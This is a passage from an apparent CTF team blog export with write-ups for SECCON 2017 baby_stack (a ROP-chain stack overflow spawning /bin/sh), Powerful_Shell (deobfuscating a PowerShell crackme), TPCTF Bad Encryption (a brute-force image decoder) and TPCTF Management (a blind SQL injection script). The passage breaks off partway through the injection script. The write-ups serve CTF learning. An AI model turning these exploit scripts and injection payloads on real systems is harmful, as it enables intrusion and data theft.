process('./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8')r.recvuntil('Please tell me your name &gt;&gt; ')r.sendline('A')r.recvuntil('Give me your message &gt;&gt; ')r.sendline(padding)r.interactive() And finally we succefully smashed the stack! and replaced the return address to 0xdeadbeef:1234567$ python writeup.py ...Thank you, \\x18\\x00\\x00!msg : X�\u0003unexpected fault address 0xdeadbeeffatal error: fault[signal 0xb code=0x1 addr=0xdeadbeef pc=0xdeadbeef] Build a ropchainNow that we replaced the return address to 0xdeadbeef we can finally start by doing our ropchain, to build this ropchain we need to know a bit of assembly but first we need to know how a syscall works as assembly and which registers it uses as arguments: 1syscall(RAX, RDI, RSI, RDX) Where RAX is the system call number and RDI must have an address that points into ‘/bin/sh’ the rest of the registers are about the arguments! in this case we can just set them into zeros… So to build a successful ropchain we need to search some good gadgets. Setting /bin/sh address to RDIFirst of all we need to store /bin/sh into memory, we need a valid address to store it so we actually need to find a nice one to store our string, normally we want to use the .bss data segment, we can find it’s address in IDA: .bss is perfect its address doesn’t change on different runs because PIE protection isn’t enabled, and as the picture above says in IDA we have read and write permissions which is what we want. Now we need a special gadget for this, we need something that moves data from a register into a memory address, the ideal gadget would be MOV [RDI], RAX, with the preference that it’s a qword MOV, since /bin/sh is a quite big string we need a 64bit MOV (if a 64 bit MOV weren’t available we could do it by spliting into multiple moves), so lets check with ROPGadgets, if we have a 64bit MOV: 1234567ROPgadget --binary baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 | grep 'mov qword ptr \\[rdi\\], '0x000000000045681b : clc ; mov qword ptr [rdi], rax ; mov qword ptr [rdi + rbx - 8], rcx ; ret0x0000000000456826 : mov eax, dword ptr [rsi] ; mov qword ptr [rdi], rax ; ret0x0000000000456490 : mov qword ptr [rdi], rax ; mov qword ptr [rdi + rbx - 8], rax ; ret0x000000000045681c : mov qword ptr [rdi], rax ; mov qword ptr [rdi + rbx - 8], rcx ; ret0x0000000000456499 : mov qword ptr [rdi], rax ; ret0x0000000000456825 : mov rax, qword ptr [rsi] ; mov qword ptr [rdi], rax ; ret There we go, the mov qword ptr [rdi], rax ; ret is the gadget we need! we just need to store the .bss address into RDI, and the string /bin/sh into RAX, to store them into RDI and RAX we need gadgets like POP RDI ; RET and POP RAX ; RET, this gadgets will get the value on the top of the stack and store it in the respective register that’s what POP does: 12345678$ ROPgadget --binary baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 | grep 'pop rdi ;'0x000000000044a282 : pop rdi ; adc eax, 0x24448900 ; and byte ptr [rcx], bh ; ret0x000000000042274f : pop rdi ; add byte ptr [rax], al ; add rsp, 0x20 ; ret0x0000000000429eea : pop rdi ; call 0x4010080x0000000000470931 : pop rdi ; or byte ptr [rax + 0x39], cl ; ret$ ROPgadget --binary baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 | grep 'pop rax ; ret'0x00000000004016ea : pop rax ; ret0x0000000000429283 : pop rax ; ret 0xf66 We have both gadgets but as we can see the pop rdi ; or byte ptr [rax + 0x39], cl ; ret gadget has an instruction between POP RDI and RET, We require to set RAX into a valid address before using this gadget otherwise we SEGFAULT. Finally we have everything we need to store the address of /bin/sh into RDI: 12345678# setting /bin/sh into bss addressropchain += p64(0x4016ea) # pop rax ; retropchain += p64(BSS) # @.dataropchain += p64(0x0000000000470931) # pop rdi ; or byte ptr [rax + 0x39], cl ; retropchain += p64(BSS) # @.dataropchain += p64(0x4016ea) # pop rax ; retropchain += '/bin/sh\\x00'ropchain += p64(0x0000000000456499) # mov qword ptr [rdi], rax ; ret Clearing RSI and RDXNow that we have the address of /bin/sh in RDI we need to clear the registers RSI and RDX into zero, we can do this with POP RET gadgets : 1234567# clear rsi and rdx registersropchain += p64(0x4016ea) # pop rax ; retropchain += p64(BSS) # @.dataropchain += p64(0x00000000004a247c) # pop rdx ; or byte ptr [rax - 0x77], cl ; retropchain += p64(0x0)ropchain += p64(0x000000000046defd) # pop rsi ; retropchain += p64(0x0) And finally we can’t forget to set RAX into the execve system call number which is 0x3b, you can get a full list of system call numbers at https://filippo.io/linux-syscall-table/ , once again we can use POP RET gadget to do this: Setting 0x3b into RAX123456# setting rax into execve 0x3b syscall numberropchain += p64(0x00000000004016ea) # pop rax ; retropchain += p64(0x3b)# call system callropchain += p64(0x0000000000456889) # syscall ; ret My final Exploit will look like this: 123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *def getConn(): return process('./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8') if local else remote('baby_stack.pwn.seccon.jp', 15285)local = Falser = getConn()padding = 'A' * 104r.recvuntil('Please tell me your name &gt;&gt; ')r.sendline('A')r.recvuntil('Give me your message &gt;&gt; ')BSS = 0x59F920ropchain = ''# setting /bin/sh into bss addressropchain += p64(0x4016ea) # pop rax ; retropchain += p64(BSS) # @.dataropchain += p64(0x0000000000470931) # pop rdi ; or byte ptr [rax + 0x39], cl ; retropchain += p64(BSS) # @.dataropchain += p64(0x4016ea) # pop rax ; retropchain += '/bin/sh\\x00'ropchain += p64(0x0000000000456499) # mov qword ptr [rdi], rax ; ret# clear rsi and rdx registersropchain += p64(0x4016ea) # pop rax ; retropchain += p64(BSS) # @.dataropchain += p64(0x00000000004a247c) # pop rdx ; or byte ptr [rax - 0x77], cl ; retropchain += p64(0x0)ropchain += p64(0x000000000046defd) # pop rsi ; retropchain += p64(0x0)# setting rax into execve 0x3b syscall numberropchain += p64(0x00000000004016ea) # pop rax ; retropchain += p64(0x3b)# call system callropchain += p64(0x0000000000456889) # syscall ; retr.sendline(padding + p64(0xc82003fd58) + p64(0x00) + 'A'*80 + p64(0xc82003fd58) + p64(0x00) + 'A'*192 + ropchain)r.interactive() By running it we can get the flag: 123456789101112$ python back_stack.py[+] Opening connection to baby_stack.pwn.seccon.jp on port 15285: Done[*] Switching to interactive modeThank you, !msg : $ lsbaby_stackflag.txt$ iduid=30831 gid=30000(baby_stack) groups=30000(baby_stack)$ cat flag.txtSECCON&#123;'un54f3'm0dul3_15_fr13ndly_70_4774ck3r5&#125;","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"},{"name":"x64","slug":"Pwn/x64","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/"},{"name":"Stack Issue","slug":"Pwn/x64/Stack-Issue","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Stack-Issue/"},{"name":"Stack Overflow","slug":"Pwn/x64/Stack-Issue/Stack-Overflow","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Stack-Issue/Stack-Overflow/"}],"tags":[{"name":"rop","slug":"rop","permalink":"https://teamrocketist.github.io/tags/rop/"},{"name":"pwn","slug":"pwn","permalink":"https://teamrocketist.github.io/tags/pwn/"},{"name":"stack_overflow","slug":"stack-overflow","permalink":"https://teamrocketist.github.io/tags/stack-overflow/"},{"name":"go","slug":"go","permalink":"https://teamrocketist.github.io/tags/go/"},{"name":"statically_linked","slug":"statically-linked","permalink":"https://teamrocketist.github.io/tags/statically-linked/"},{"name":"seccon2017","slug":"seccon2017","permalink":"https://teamrocketist.github.io/tags/seccon2017/"}]},{"title":"[Reverse] SECCON - Powerful_Shell","slug":"Reverse-SECCON-Powerful-Shell","date":"2017-12-10T10:03:07.000Z","updated":"2022-08-23T00:14:55.169Z","comments":true,"path":"2017/12/10/Reverse-SECCON-Powerful-Shell/","link":"","permalink":"https://teamrocketist.github.io/2017/12/10/Reverse-SECCON-Powerful-Shell/","excerpt":"","text":"Powerful_Shell300 pointsPowerful_ShellCrack me.powerful_shell.ps1-1fb3af91eafdbebf3b3efa3b84fcc10cfca21ab53db15c98797b500c739b0024 Windows powershell… We started by analysing the file: 12345678910111213141516171819202122232425262728293031$ECCON=\"\";$ECCON+=[char](3783/291);$ECCON+=[char](6690/669);$ECCON+=[char](776-740);$ECCON+=[char](381-312);$ECCON+=[char](403-289);$ECCON+=[char](-301+415);$ECCON+=[char](143-32);$ECCON+=[char](93594/821);$ECCON+=[char](626-561);$ECCON+=[char](86427/873);$ECCON+=[char](112752/972);$ECCON+=[char](43680/416);$ECCON+=[char](95127/857);$ECCON+=[char](-682+792);$ECCON+=[char](-230+310);$ECCON+=[char](-732+846);$ECCON+=[char](1027-926);$ECCON+=[char](94044/922);$ECCON+=[char](898-797);$ECCON+=[char](976-862);$ECCON+=[char](52419/519);$ECCON+=[char](1430/13);$ECCON+=[char](18216/184);$ECCON+=[char](21715/215);$ECCON+=[char](12320/385);$ECCON+=[char]([int][Math]::sqrt([Math]::pow(61,2)));.....Write-Progress -Activity \"Extracting Script\" -status \"20040\" -percentComplete 99;$ECCON+=[char](520-510);Write-Progress -Completed -Activity \"Extracting Script\";.([ScriptBlock]::Create($ECCON)) As we can see we have alot of operations, it looks like something is being hidden behind those arithmetic operations, I did a python script to parse all the operation using regex: 12345678910111213import refrom math import *script = ''lines = open('powerful_shell','r').read().split('\\n')for line in lines: if 'sqrt' in line: op = line.replace('$ECCON+=[char]([int][Math]::','').replace('[Math]::','').replace(';','').replace(')','') + '))' script += chr(int(eval(op))) elif '$ECCON' in line and len(re.findall(r'\\((-*[0-9]+.-*[0-9]+)\\)', line)) &gt; 0: op = re.findall(r'\\((-*[0-9]+.-*[0-9]+)\\)', line)[0] script += chr(int(eval(op)))print script After extracting it we got this: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142... truncanted ...$keytone=@&#123;'a'=261.63&#125;$pk='a'ForEach($k in ('w','s','e','d','f','t','g','y','h','u','j','k'))&#123; $keytone+=@&#123;$k=$keytone[$pk]*[math]::pow(2,1/12)&#125;;$pk=$k &#125;Write-Host -b 00 -f 15 \"Play the secret melody.\"Write-Host -b 15 -f 00 -n ' 'Write-Host -b 00 -f 15 -n ' 'Write-Host -b 15 -f 00 -n ' 'Write-Host -b 00 -f 15 -n ' 'Write-Host -b 15 -f 00 -n ' | 'Write-Host -b 00 -f 15 -n ' 'Write-Host -b 15 -f 00 -n ' 'Write-Host -b 00 -f 15 -n ' 'Write-Host -b 15 -f 00 -n ' 'Write-Host -b 00 -f 15 -n ' 'Write-Host -b 15 -f 00 ' | ' Write-Host -b 15 -f 00 -n ' 'Write-Host -b 00 -f 15 -n ' 'Write-Host -b 15 -f 00 -n ' 'Write-Host -b 00 -f 15 -n ' 'Write-Host -b 15 -f 00 -n ' | 'Write-Host -b 00 -f 15 -n ' 'Write-Host -b 15 -f 00 -n ' 'Write-Host -b 00 -f 15 -n ' 'Write-Host -b 15 -f 00 -n ' 'Write-Host -b 00 -f 15 -n ' 'Write-Host -b 15 -f 00 ' | ' Write-Host -b 15 -f 00 -n ' 'Write-Host -b 00 -f 15 -n ' w 'Write-Host -b 15 -f 00 -n ' 'Write-Host -b 00 -f 15 -n ' e 'Write-Host -b 15 -f 00 -n ' | 'Write-Host -b 00 -f 15 -n ' t 'Write-Host -b 15 -f 00 -n ' 'Write-Host -b 00 -f 15 -n ' y 'Write-Host -b 15 -f 00 -n ' 'Write-Host -b 00 -f 15 -n ' u 'Write-Host -b 15 -f 00 ' | ' Write-Host -b 15 -f 00 -n ' |'Write-Host -b 15 -f 00 -n ' |'Write-Host -b 15 -f 00 -n ' |'Write-Host -b 15 -f 00 -n ' |'Write-Host -b 15 -f 00 -n ' |'Write-Host -b 15 -f 00 -n ' |'Write-Host -b 15 -f 00 -n ' |'Write-Host -b 15 -f 00 ' 'Write-Host -b 15 -f 00 -n ' a |'Write-Host -b 15 -f 00 -n ' s |'Write-Host -b 15 -f 00 -n ' d |'Write-Host -b 15 -f 00 -n ' f |'Write-Host -b 15 -f 00 -n ' g |'Write-Host -b 15 -f 00 -n ' h |'Write-Host -b 15 -f 00 -n ' j |'Write-Host -b 15 -f 00 ' k 'Write-Host -b 15 -f 00 -n ' |'Write-Host -b 15 -f 00 -n ' |'Write-Host -b 15 -f 00 -n ' |'Write-Host -b 15 -f 00 -n ' |'Write-Host -b 15 -f 00 -n ' |'Write-Host -b 15 -f 00 -n ' |'Write-Host -b 15 -f 00 -n ' |'Write-Host -b 15 -f 00 ' 'Write-Host$stage1=@();$f=\"\";While($stage1.length -lt 14)&#123; $key=(Get-Host).ui.RawUI.ReadKey(\"NoEcho,IncludeKeyDown\") $k=[String]$key.Character $f+=$k; If($keytone.Contains($k))&#123; $stage1+=[math]::floor($keytone[$k]) [console]::beep($keytone[$k],500) &#125;&#125;$secret=@(440,440,493,440,440,493,440,493,523,493,440,493,440,349)If($secret.length -eq $stage1.length)&#123; For ($i=1; $i -le $secret.length; $i++) &#123; If($secret[$i] -ne $stage1[$i])&#123; Exit &#125; &#125; x \"Correct. Move to the next stage.\"&#125;$text=@\"YkwRUxVXQ05DQ1NOE1sVVU4TUxdTThBBFVdDTUwTURVTThMqFldDQUwdUxVRTBNEFVdAQUwRUxtTTBEzFVdDQU8RUxdTbEwTNxVVQUNOEFEVUUwdQBVXQ0NOE1EWUUwRQRtVQ0FME1EVUU8RThdVTUNMEVMVUUwRFxdVQUNCE1MXU2JOE0gWV0oxSk1KTEIoExdBSDBOE0MVO0NKTkAoERVDSTFKThNNFUwRFBVINUFJTkAqExtBSjFKTBEoF08RVRdKO0NKTldKMUwRQBc1QUo7SlNgTBNRFVdJSEZCSkJAKBEVQUgzSE8RQxdMHTMVSDVDSExCKxEVQ0o9SkwRQxVOE0IWSDVBSkJAKBEVQUgzThBXFTdDRExAKhMVQ0oxTxEzFzVNSkxVSjNOE0EWN0NITE4oExdBSjFMEUUXNUNTbEwTURVVSExCKxEVQ0o9SkwRQxVOEzEWSDVBSkJAKBEVQUgzThAxFTdDREwTURVKMUpOECoVThNPFUo3U0pOE0gWThNEFUITQBdDTBFKF08RQBdMHRQVQUwTSBVOEEIVThNPFUNOE0oXTBFDF0wRQRtDTBFKFU4TQxZOExYVTUwTSBVMEUEXTxFOF0NCE0oXTBNCFU4QQRVBTB1KFU4TThdMESsXQ04TRBVMEUMVThNXFk4TQRVNTBNIFUwRFBdPEUEXQ0ITShdME0EVThBXFU4TWxVDThNKF0wRMBdMETUbQ0wRShVOE0MWThMqFU1ME0gVTBFDF08RQxdMHUMVQUwTSBVOEEEVThNNFUwRNRVBTBFJF0wRQxtME0EVTBFAF0BOE0gVQhNGF0wTKhVBTxFKF0wdMxVOEzUXQ04QSBVOE0AVTBFVFUFMEUkXTBFDG0wTQRVMETMXQE4TSBVCE0MXTBNBFU4QQRVBTB1KFU4TQxdMEVYXTBEUG0NMEUoVThNBFk4TQRVCEygXQ0wRShdPEUMXTB1DFU4TQBdDThBIFU4TSBVMESgVQUwRSRdMEUYbTBMWFUNOE0gWThNCFUITFBdDTBFKF08RQxdMHUMVThNVF0NOEEgVThNNFUwRQxVOE0IWQUwRShtME0EVTBFVF08RQxdDQhNKF0wTQRVOEEEVThM9FUNOE0oXTBFFF0wRKBtDTBFKFU4TQRZOE0EVQhNAF0NMEUoXTxFDF0wdVRVOEzMXQ04QSBVOE00VTBFVFU4TQRZBTBFKG0wTRBVMESgXQE4TSBVCE0MXTBNBFU4QKhVBTB1KFU4TFBdMEUIXQ04TRBVMEUMVThNBFk4TNxVNTBNIFUwRQxdPEUMXTB01FUFME0gVThBBFU4TTRVMERQVQUwRSRdMEUMbTBNBFUwRQxdAThNIFUITQxdME0EVThAxFUFMHUoVThNDF0wRVhdMEVUbQ0wRShVOE0QWThMWFU1ME0gVTBFDF08RRhdDQhNKF0wTQRVOEFcVQUwdShVOE0EXTBFFF0NOE0QVTBFDFU4TVxZOEyoVTUwTSBVMETMXTxFVF0NCE0oXTBNEFU4QQhVBTB1KFU4TQBdMERcXQ04TRBVMEUAVThNDFkFMEUobTBNCFUwRQRdAThNIFUITQRdMExYVQU8RShdMHUEVThNOF0NOEEgVThNIFUwRKBVBTBFJF0wRMxtMEzcVQ04TSBZOE0EVQhNVF0wTQRVBTxFKF0wdQxVOE0MXTBFFF0NOE0QVTBFGFU4TKhZBTBFKG0wTRBVMERQXQE4TSBVCE04XTBNXFUFPEUoXTB0zFU4TThdDThBIFU4TTRVMEUMVThMWFkFMEUobTBNCFUwRFBdAThNIFUITQxdME0EVThAxFUFMHUoVThNGF0wRQxdDThNEFUwRQRVOEyoWQUwRShtMEzcVTBFDF0BOE0gVQhMzF0wTFhVBTxFKF0wdMxVOExQXQ04QSBVOE0gVTBEUFUFMEUkXTBEzG0wTQRVDThNIFk4TQRVCEygXTBNEFUFPEUoXTB1DFU4TRhdDThBIFU4TTRVMEVUVQUwRSRdMERQbQ0wRShVOE0wWThNDFU1ME0gVTBFDF08RQxdMHTMVQUwTSBVOEEEVThNbFUwRNRVBTBFJF0wRQxtME0EVTBFAF0BOE0gVQhNDF0wTVxVOEEEVQUwdShVOEzMXTBE2F0NOE0QVTBFBFU4TKhZBTBFKG0wTQRVMEUMXTxFDF0NCE0oXTBNBFU4QQRVOEzsVQ04TShdMEUAXTBFDG0wTQhVDThNIFk4TRBVCEygXQ0wRShdPEUYXTB0UFUFME0gVThBDFU4TTRVDThNKF0wRQBdMEUMbTBNBFUNOE0gWThNBFUITQxdME0EVQU8RShdMHUMVThNVF0wRVhdDThNEFUwRRhVOEyoWQUwRShtME0MVTBEzF0BOE0gVQhNDF0wTQRVOEEEVQUwdShVOExQXTBFNF0NOE0QVTBFGFU4TRBZBTBFKG0wTRBVMERQXQE4TSBVCEzUXTBMWFUFPEUoXTB1DFU4TRhdDThBIFU4TTRVMEVUVQUwRSRdMERQbQ0wRShVOE0wWThNDFU1ME0gVTBFDF08RQxdMHTMVQUwTSBVOEEEVThNbFUwRNRVBTBFJF0wRQxtME0EVTBFAF0BOE0gVQhNDF0wTVxVOEEEVQUwdShVOEzMXTBE2F0NOE0QVTBFBFU4TKhZBTBFKG0wTQRVMEUMXTxFDF0NCE0oXTBNBFU4QQRVOEzsVQ04TShdMEUAXTBFDG0wTQhVDThNIFk4TRBVCEygXQ0wRShdPEUYXTB0zFUFME0gVThBMFU4TSBVDThNKF0wRQxdMERQbQ0wRShVOE0IWThNDFU1ME0gVTBFAF08RQRdDQhNKF0wTQxVOEBYVQUwdShVOE0EXTBFNF0NOE0QVTBFDFU4TKhZOE0QVTUwTSBVMEUYXTxFAF0NCE0oXTBNCFU4QFhVBTB1KFU4TQBdMEUIXQ04TRBVMEUAVThNDFkFMEUobTBNDFUwRFBdAThNIFUITQRdME0wVQU8RShdMHUMVThMoF0wRNhdDThNEFUwRRhVOEzEWQUwRShtME0EVTBFGF0BOE0gVQhNDF0wTVxVBTxFKF0wdQxVOEygXTBE2FxROE10VShZOTBFTF2E=\"@$plain=@()$byteString = [System.Convert]::FromBase64String($text)$xordData = $(for ($i = 0; $i -lt $byteString.length; ) &#123; for ($j = 0; $j -lt $f.length; $j++) &#123; $plain+=$byteString[$i] -bxor $f[$j] $i++ if ($i -ge $byteString.Length) &#123; $j = $f.length &#125; &#125;&#125;)iex([System.Text.Encoding]::ASCII.GetString($plain)) I removed some of the beginning of the script, it was useless code and was just printing some things to the screen, continuing with the rest we have more two steps to conclude, the first one was to play the piano accordantly to the key in the code 440,440,493,440,440,493,440,493,523,493,440,493,440,349. 12345678910While($stage1.length -lt 14)&#123; $key=(Get-Host).ui.RawUI.ReadKey(\"NoEcho,IncludeKeyDown\") $k=[String]$key.Character $f+=$k; If($keytone.Contains($k))&#123; $stage1+=[math]::floor($keytone[$k]) Write-Host ([math]::floor($keytone[$k])).toString(),$k [console]::beep($keytone[$k],500) &#125;&#125; Each key of the piano corresponds to a number this is easy to discover without having to even look at the code, I just added a few prints in the loop and go through the executable and enter the correct key for the piano was hhjhhjhjkjhjhfThe last phase is to decrypt that big base64 string with the key we got from the piano, once again we don’t even need to check the code just print the variable and you will get the last powershell script of the challenge. 1234567891011121314$plain=@()$byteString = [System.Convert]::FromBase64String($text)$xordData = $(for ($i = 0; $i -lt $byteString.length; ) &#123; for ($j = 0; $j -lt $f.length; $j++) &#123; $plain+=$byteString[$i] -bxor $f[$j] $i++ if ($i -ge $byteString.Length) &#123; $j = $f.length &#125; &#125;&#125;)iex([System.Text.Encoding]::ASCII.GetString($plain))Write-Host iex([System.Text.Encoding]::ASCII.GetString($plain))Read-Host -Prompt \"Press Enter to exit\" Now we get another powershell script but the obfuscation on this one is real asking for a password:Well it wasn’t very hard to me to reverse it, if you look closely there are alot of semicolons separating each variable assignment, for instance I checked one bye one variable and the one who looked interesting was the variable {;} 12PS C:\\Users\\root&gt; $&#123;;&#125;iex iex is an invocation, for example it can be used to run a .ps1 file, if we look closely at the end of the script we can see a very big string (in green) which is being piped into iex:if we copy that big string into the terminal we can see alot of [char]number, to easily convert them into text we can assign it into a variable and then call it and get the password!As we can see the flag was the password! SECCON{P0wEr$H311}","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://teamrocketist.github.io/categories/Reverse/"}],"tags":[{"name":"python","slug":"python","permalink":"https://teamrocketist.github.io/tags/python/"},{"name":"seccon2017","slug":"seccon2017","permalink":"https://teamrocketist.github.io/tags/seccon2017/"},{"name":"powershell","slug":"powershell","permalink":"https://teamrocketist.github.io/tags/powershell/"},{"name":"obfuscation","slug":"obfuscation","permalink":"https://teamrocketist.github.io/tags/obfuscation/"}]},{"title":"[Reverse] TPCTF2017 - Bad Encryption","slug":"Reverse-TPCTF2017-Bad-Encryption","date":"2017-12-04T06:06:23.000Z","updated":"2022-08-23T00:14:55.169Z","comments":true,"path":"2017/12/04/Reverse-TPCTF2017-Bad-Encryption/","link":"","permalink":"https://teamrocketist.github.io/2017/12/04/Reverse-TPCTF2017-Bad-Encryption/","excerpt":"","text":"Bad Encryption100I was making an encryption program, but it is far from perfect. Instead of make the encryption work, I decided to just encrypt everything 100 times.Author: Kevin Higgs We have a python program, which is little bit obfuscated with this horrible named variables: 12345678910111213141516171819202122for i in range(1,101): tel1l1l1l1l1l1l1lt = \"REDACTED\" import builtins, random l1l1l1l1l1l1l1l = getattr(builtins, \"__import__\") l1l1l1l1l1l1l1l = l1l1l1l1l1l1l1l(\"PIL.Image\") l1l1l1l1l1l1l1ll1l1l1l1l1l1l1l = l1l1l1l1l1l1l1l.Image l1l1l1l1l1l1l1ll1l1l1l1l1l1l1ll1l1l1l1l1l1l1l = l1l1l1l1l1l1l1ll1l1l1l1l1l1l1l.new(\"RGB\", (len(tel1l1l1l1l1l1l1lt), 1), \"white\") l1l1l1l1l1l1l1ll1l1l1l1l1l1l1ll1l1l1l1l1l1l1ll1l1l1l1l1l1l1l = l1l1l1l1l1l1l1ll1l1l1l1l1l1l1ll1l1l1l1l1l1l1l.load() l1l1l1l1l1l1l1ll1l1l1l111l1l11 = 0 for l1l1l1l1l1l1l1ll1l1l1l1l1l1l11 in tel1l1l1l1l1l1l1lt: l1l1l1l1l1l1l1ll1l1l1l1l1l1l11 = ord(l1l1l1l1l1l1l1ll1l1l1l1l1l1l11) l1l1l1l1l1l1l1ll1l1l1l1lll1l111 = random.randint(1,256) l1l1l1l1l1l1l1ll1l1l1l1lll1l112 = random.randint(1,256) l1l1l1l1l1l1l1ll1l1l1l1lll1l113 = random.randint(1,256) l1l1l1l1l1l1l11ll1l1l1l1lll1l111 = (l1l1l1l1l1l1l1ll1l1l1l1lll1l111/256) l1l1l1l1l1l1l11ll1l1l1l1lll1l112 = (l1l1l1l1l1l1l1ll1l1l1l1lll1l112/256) l1l1l1l1l1l1l11ll1l1l1l1lll1l113 = (l1l1l1l1l1l1l1ll1l1l1l1lll1l113/256) l1l121l1l1l1l11ll1l1l1l1lll1l111 = l1l1l1l1l1l1l1ll1l1l1l1l1l1l11*l1l1l1l1l1l1l11ll1l1l1l1lll1l111 l1l121l1l1l1l11ll1l1l1l1lll1l112 = l1l121l1l1l1l11ll1l1l1l1lll1l111*l1l1l1l1l1l1l11ll1l1l1l1lll1l112 l1l1l1l1l1l1l1ll1l1l1l1l1l1l1ll1l1l1l1l1l1l1ll1l1l1l1l1l1l1l[l1l1l1l1l1l1l1ll1l1l1l111l1l11,0] = (l1l1l1l1l1l1l1ll1l1l1l1lll1l111, l1l1l1l1l1l1l1ll1l1l1l1lll1l112, round(l1l121l1l1l1l11ll1l1l1l1lll1l112*10)) l1l1l1l1l1l1l1ll1l1l1l111l1l11 += 1 l1l1l1l1l1l1l1ll1l1l1l1l1l1l1ll1l1l1l1l1l1l1l.save(\"out\"+str(i)+\".png\") After fixing the code to be more readable I got this: 1234567891011121314151617from PIL import Imagefor i in range(1,101): import builtins, random img = Image.new(\"RGB\", (len(flag), 1), \"white\") pixels = img.load() counter = 0 for character in flag: character = ord(character) rand0 = random.randint(1,256) rand1 = random.randint(1,256) rand3 = (rand0/256) rand4 = (rand1/256) rand5 = character*rand3 rand6 = rand5*rand4 pixels[counter,0] = (rand0, rand1, round(rand6*10)) counter += 1 img.save(\"out\"+str(i)+\".png\") We can see rand0 and rand1 are being random generated, but they are putted directly into the image in the pixels red and blue!, by having these two we can calculate round(rand6*10) easily by doing some arithmetic operations, with this we can do a script that brute-forces the flag byte by byte, by comparing the blue pixels from the image with the ones we calculated: The pseudo code:123456789101112flag = ''for character in all_printable_characters: for pixel in image: rand0 = pixel.red rand1 = pixel.blue rand3 = rand0/256 rand4 = rand1/256 rand5 = ord(character)*rand3 rand6 = rand5*rand4 if rand6 == pixel.blue: flag += character break But we ran into a problem, as the description of the challenge says sometimes the encryption doesn’t work and one of the reasons is the calculations made by the rand variables can be above 255 (Kind of depends of the random value or the character), we know that color pixels from the images can only handle colors in the range of 0-255 (in this case python will set the pixel as 255), a byte! This why the encryption does it multiple times (100) with different random values, another problem we have is once in a while multiple characters matches the same blue pixel, in these both cases we can’t know for sure if it is the character we want. So my solution to this was to ignore all characters that were above 255 and those that had multiple solutions to that byte position of the flag, since we have more than enough images (100) the characters we failed to find we can recheck them in the rest of the pictures. The final python script I used was (note that using python3 in this challenge was absolutely necessary): 123456789101112131415161718192021222324252627282930313233343536373839404142import os, sysfrom PIL import Imageimport string# flag size is 38flags = []for i in range(1,101): flag = [] im = Image.open(\"out%d.png\"%i) width = im.size[0] #define W and H height = im.size[1] pix = im.load() for x in range(0,width): stop = True found = 0 for character in string.printable: r,g,b = pix[x,0] rand0 = r rand1 = g rand3 = rand0/256 rand4 = rand1/256 rand5 = ord(character)*rand3 rand6 = rand5*rand4 if round(rand6*10) &gt;= 255: continue else: if round(rand6*10) == b: found += 1 stop = False if found == 1: flag.append(character) else: flag[x] = 'x' if stop: flag.append('x') flags.append(''.join(flag))final_flag = list('xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx')for flag in flags: for i,c in enumerate(flag): if c != 'x': final_flag[i] = cprint (''.join(final_flag)) Running it 12python3 reverse.pytpctf&#123;i_c4nt_7h1nk_0f_a_fUnny_f14g_:(&#125;","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://teamrocketist.github.io/categories/Reverse/"}],"tags":[{"name":"bruteforce","slug":"bruteforce","permalink":"https://teamrocketist.github.io/tags/bruteforce/"},{"name":"reverse","slug":"reverse","permalink":"https://teamrocketist.github.io/tags/reverse/"},{"name":"tpctf2017","slug":"tpctf2017","permalink":"https://teamrocketist.github.io/tags/tpctf2017/"},{"name":"bytebybyte","slug":"bytebybyte","permalink":"https://teamrocketist.github.io/tags/bytebybyte/"},{"name":"python3","slug":"python3","permalink":"https://teamrocketist.github.io/tags/python3/"}]},{"title":"[Web] TPCTF2017 - Management","slug":"Web-TPCTF2017-Management","date":"2017-12-04T05:20:20.000Z","updated":"2022-08-23T00:14:55.169Z","comments":true,"path":"2017/12/04/Web-TPCTF2017-Management/","link":"","permalink":"https://teamrocketist.github.io/2017/12/04/Web-TPCTF2017-Management/","excerpt":"","text":"Management60I’ve created a new website so you can do all your important management. It includes users, creating things, reading things, and… well, not much else. Maybe there’s a flag?Second instance running at 52.90.229.46:8558tpctf{san1t1z3_y0ur_1npu7s} is not the correct flag. Look harder ;)Note: the flag format is flag{}, not the usual tpctf{}Author: Kevin Higgs Opening the website we can see we can choose the user: After doing this its shown a new form where we could read/insert into the columns data from the table users from the current user:We can see which sql query is being executed: 1SELECT `1` FROM users WHERE name = 'custom-kevin';Result: 1 It’s shown in the website! all inputs are being sanitized for the exception of the POST parameter number! I used Blind Sql injection to do this challenge (Boolean Based) the base payload I used was 11`=if((SELECT hex(substring('Abc',1,1)))=hex(substring('A',1,1)),`1`, 'False'), `1 It’s important to use HEX function because substring is case insensitive and would return wrong queries if we didn’t use it, notice that what is going to be shown in the page is the result of the comparison we are making in the sql query so if the comparison is true our query will show in the page Result: 1 if it’s false it will return Result: 0, doing this by hand is tedious so I wrote a python script to automate the stuff: 12345678910111213141516171819202122232425262728import requestsimport stringurl='http://52.90.229.46:8558'TABLE_NAME = 'SELECT hex(substring(table_name,1,%d)) FROM information_schema.tables WHERE table_schema=database() limit %d,1'SUBSTRING_HEX_NAME = \"hex(substring('&#123;&#125;',1,&#123;&#125;))\"USERS_NAME = 'SELECT hex(substring(name,1,%d)) FROM users limit %d,1'name = ''cookie = &#123;'user': 'kevin'&#125;for j in range(1,5): name = '' for i in range(1,60+1): stop = True for l in string.printable: PAYLOAD = \"1`=if((%s)=%s,`1`, 'False'),`9\" % (USERS_NAME%(i,j), SUBSTRING_HEX_NAME.format(name+l,i))#SUBSTRING_NAME.format(name+l, i)) #print PAYLOAD r = requests.post(url, data=&#123;'number':'%s'%PAYLOAD,'action':'Read', 'value':''&#125;, cookies=cookie, timeout=6) if 'Result: 1' in r.text: #print 